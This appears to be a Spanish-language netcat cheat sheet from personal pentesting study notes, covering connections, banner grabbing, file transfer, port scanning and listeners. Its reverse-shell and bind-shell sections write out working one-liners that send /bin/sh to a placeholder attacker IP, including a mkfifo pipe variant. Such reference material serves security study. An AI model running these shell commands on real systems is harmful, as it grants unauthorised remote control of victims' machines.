# Netcat — Cheat Sheet

> Lectura/escritura de conexiones de red, reverse shells, transfers.

---

## Uso básico

```bash
nc <host> <port>                 # Conectar
nc -l <port>                     # Escuchar
nc -v <host> <port>              # Verbose
```

## Banner grabbing

```bash
nc <host> <port>                 # Conectar y ver banner
nc -v <host> 21                  # FTP banner
nc -v <host> 25                  # SMTP banner
```

## Transferencia de archivos

```bash
# Receptor
nc -lvnp 4444 > archivo_recibido

# Emisor
nc <host> 4444 < archivo_enviar
```

## Reverse shell

```bash
# Víctima
nc -e /bin/sh <attacker_ip> 4444

# Sin -e (si no está compilado con support)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f
```

## Bind shell

```bash
# Víctima
nc -lvnp 4444 -e /bin/sh

# Atacante
nc <victim_ip> 4444
```

## Port scanning

```bash
nc -zv <host> 1-1000             # Scan range
nc -zv <host> 80,443             # Scan specific ports
nc -zvn <host> 1-1000            # Sin resolve DNS
```

## Listener con options

```bash
nc -lvnp <port>                  # Listen verbose, numeric, no DNS
nc -k -lvnp <port>               # Keep alive (no cerrar después de conexión)
```







---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[Metasploit.md|Metasploit]] — Escalada de Privilegios, Forense Digital, Netcat / Reverse Shells
- [[../../apuntes evolve/BLOQUE 6.md|BLOQUE 6]] — Escalada de Privilegios, Forense Digital, Netcat / Reverse Shells
- [[../11 - Forense Digital/Análisis Forense y Memoria.md|Análisis Forense y Memoria]] — Escalada de Privilegios, Forense Digital, Netcat / Reverse Shells
- [[../../apuntes evolve/BLOQUE 7.md|BLOQUE 7]] — Escalada de Privilegios, Forense Digital, Netcat / Reverse Shells
- [[../06 - Explotacion y Post-Explotacion/Explotación de Servicios - Windows.md|Explotación de Servicios - Windows]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells
- [[../../apuntes Chema/Introducción a Consolas - Bash y PowerShell.md|Introducción a Consolas - Bash y PowerShell]] — Escalada de Privilegios, Metasploit, Netcat / Reverse Shells

### 🛠️ Herramientas

- [[comandos/Metasploit|Metasploit]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]

> #escalada-privilegios #forense #linux #metasploit #netcat #pentest #post-explotacion #redes #reverse-shell #windows
